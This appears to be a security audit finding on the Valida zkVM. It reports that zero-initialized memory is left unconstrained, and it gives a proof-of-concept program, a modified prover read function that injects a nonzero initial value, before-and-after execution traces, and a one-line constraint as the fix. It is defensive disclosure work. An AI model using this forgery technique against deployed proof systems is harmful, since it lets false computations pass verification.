Currently, values in the memory are expected to be initialized to zero, while there is no such constraint in MemoryChip:

A working PoC is available here: https://github.com/Koukyosyumei/valida-vm/tree/poc-memory-attack-1
Run with

```bash
cd basic-api/tests/
cargo test prove_target --release
```

This PoC considers the following program:

```rust
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([0, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BneInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);
```

This program is expected to produce the following traces:

```
Main trace for Chip: CPU
--------------------------------------------------------------------------------
CPU row 0: CpuCols { clk: 0, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([0, 1, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4096, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 1: CpuCols { clk: 1, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 3: CpuCols { clk: 3, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 4: CpuCols { clk: 4, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 5: CpuCols { clk: 5, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 6: CpuCols { clk: 6, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 7: CpuCols { clk: 7, pc: 4, fp: 4096, instruction: InstructionCols { opcode: 8, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }

Main trace for Chip: Memory
--------------------------------------------------------------------------------
Memory row 0: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 2, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 1: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 2, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 2: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 3, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 3: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 5, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 4: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 5, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 5: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 6, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 6: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 1, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 7: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 1, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 8: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 3, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 9: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 4, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 10: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 6, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 11: MemoryCols { addr: 4096, addr_bytes: Word([0, 16, 0, 0]), value: Word([0, 0, 0, 0]), clk: 0, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 12: MemoryCols { addr: 4096, addr_bytes: Word([0, 16, 0, 0]), value: Word([1, 0, 0, 0]), clk: 0, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Main trace dimensions for Chip: Memory
```

By modifying the `read` function of the Memory:

```rust
        // Attempt to get the memory record from the current segment's memory backend
        let mut record: MemoryRecord = state
            .runtime
            .memory_backend()
            .get(&address)
            .copied()
            .unwrap_or_default();
        if let MemoryAccessTimestamp::ZeroInitialized = record.last_accessed {
            record.value = Word::<u8>::from_u8(1);
        }
```

The program reads the maliciously initialized value, altering the state transition:

```
Main trace for Chip: CPU
--------------------------------------------------------------------------------
CPU row 0: CpuCols { clk: 0, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([0, 1, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4096, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 1: CpuCols { clk: 1, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 3: CpuCols { clk: 3, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 4: CpuCols { clk: 4, pc: 4, fp: 4096, instruction: InstructionCols { opcode: 8, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
Main trace dimensions for Chip: CPU

--------------------------------------------------------------------------------
Main trace for Chip: Memory
--------------------------------------------------------------------------------
Memory row 0: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 2, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 1: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 2, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 2: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 3, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 3: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 1, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 4: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 1, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 5: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 3, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 6: MemoryCols { addr: 4096, addr_bytes: Word([0, 16, 0, 0]), value: Word([0, 0, 0, 0]), clk: 0, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 7: MemoryCols { addr: 4096, addr_bytes: Word([0, 16, 0, 0]), value: Word([1, 0, 0, 0]), clk: 0, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Main trace dimensions for Chip: Memory
```

**Recommendation**

Add

```rust
builder.when(local.is_zero_initialized).assert_zero(local.value)
```
